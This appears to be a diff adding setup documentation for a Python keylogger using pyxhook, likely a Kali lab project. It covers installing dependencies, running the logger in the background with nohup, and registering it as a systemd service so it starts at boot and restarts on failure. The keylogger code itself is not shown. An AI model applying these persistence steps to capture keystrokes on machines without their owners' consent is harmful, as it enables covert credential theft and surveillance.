@@ -1,0 +1,76 @@
+requirements.txt
+This file ensures anyone can install dependencies easily:
+bash
+pyxhook
+
+Install with:
+
+bash
+pip install -r requirements.txt
+
+Setup Virtual Environment
+bash
+python3 -m venv myenv
+source myenv/bin/activate
+
+Install Dependencies
+bash
+pip install -r requirements.txt
+
+Running the Keylogger
+bash
+python keylogger.py
+
+OR run in the background:
+bash
+nohup python keylogger.py &
+
+
+Running as a Systemd Service
+To make the keylogger run automatically in the background:
+
+Create a systemd service file:
+
+bash
+sudo nano /etc/systemd/system/keylogger.service
+
+Add the following content:
+[
+[Unit]
+Description=Keylogger Background Service
+After=network.target
+
+[Service]
+ExecStart=/home/kali/Desktop/keylogger2/myenv/bin/python /home/kali/Desktop/keylogger2/keylogger.py
+WorkingDirectory=/home/kali/Desktop/keylogger2
+Environment="DISPLAY=:0"
+Restart=on-failure
+User=kali
+Group=kali
+
+[Install]
+WantedBy=multi-user.target
+
+]
+
+Reload systemd and start the service:
+bash
+sudo systemctl daemon-reload
+sudo systemctl enable keylogger.service
+sudo systemctl start keylogger.service
+
+
+Stopping the Keylogger
+To stop the service:
+bash
+sudo systemctl stop keylogger.service
+Logs & Debugging
+
+View logs:
+
+bash
+sudo journalctl -u keylogger.service
+
+Check service status:
+bash
+sudo systemctl status keylogger.service
